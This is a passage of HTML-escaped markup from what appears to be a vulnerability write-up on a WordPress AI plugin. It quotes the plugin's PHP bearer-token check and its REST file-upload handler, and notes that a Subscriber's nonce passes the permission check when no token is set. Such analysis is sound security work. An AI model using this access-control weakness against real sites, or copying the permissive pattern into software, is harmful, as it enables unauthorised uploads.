class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;auth_via_bearer_token()&lt;/code&gt; function authenticates using a Bearer Token.&#xA;Its process:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If the request has an &lt;code&gt;Authorization&lt;/code&gt; header containing &lt;code&gt;Bearer&amp;ensp;&amp;lt;token&amp;gt;&lt;/code&gt;&#xA;and the &lt;code&gt;&amp;lt;token&amp;gt;&lt;/code&gt; value matches the token stored in the option (&lt;code&gt;$this-&amp;gt;bearer_token&lt;/code&gt;), then:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Set the current user to the first admin (&lt;code&gt;wp_set_current_user()&lt;/code&gt;),&lt;/li&gt;&#xA;&lt;li&gt;Return &lt;code&gt;true&lt;/code&gt; → allow API access.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If absent or the token is incorrect → return &lt;code&gt;$allow&lt;/code&gt;,&#xA;i.e., the initial result from &lt;code&gt;is_user_logged_in()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;By default, there will be no &lt;strong&gt;Bearer Token&lt;/strong&gt; for authentication, so we rely on a valid &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; of a Subscriber user =&amp;gt; &lt;code&gt;permission_callback=true&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;hr&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;rest_simpleFileUpload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_file_params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;if&amp;ensp;file&amp;ensp;is&amp;ensp;provided&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;for&amp;ensp;base64&amp;ensp;encoded&amp;ensp;file&amp;ensp;data&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;simpleFileUpload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$base64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$purpose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ttl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Handle&amp;ensp;regular&amp;ensp;file&amp;ensp;upload&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$purpose&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;purpose&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;purpose&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;files&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ttl&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ttl&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ttl&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;target&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;target&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;metadata&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;metadata&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;debug&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$debug&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;REST&amp;ensp;[SimpleFileUpload]:&amp;ensp;file&amp;ensp;upload,&amp;ensp;name=%s,&amp;ensp;purpose=%s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$purpose&lt;/span&gt;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Meow_MWAI_Logging&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$debug&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;simpleFileUpload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$purpose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ttl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;success&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;success&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;500&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;rest_simpleFileUpload()&lt;/code&gt; function handles file uploads via the REST API.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Retrieves parameters and files from &lt;code&gt;$request&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If no file is present, checks for base64 data and calls &lt;code&gt;$this-&amp;gt;simpleFileUpload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If a file is present, retrieves optional parameters (&lt;code&gt;purpose&lt;/code&gt;, &lt;code&gt;ttl&lt;/code&gt;, &lt;code&gt;target&lt;/code&gt;, &lt;code&gt;metadata&lt;/code&gt;), logs if debug is enabled, then calls &lt;code&gt;$this-&amp;gt;simpleFileUpload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Returns a &lt;code&gt;WP_REST_Response&lt;/code&gt; with &lt;code&gt;success&amp;ensp;=&amp;gt;&amp;ensp;true&lt;/code&gt; and the file data, or &lt;code&gt;success&amp;ensp;=&amp;gt;&amp;ensp;false&lt;/code&gt; if an error occurs.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;simpleFileUpload&lt;/span&gt;&lt;span 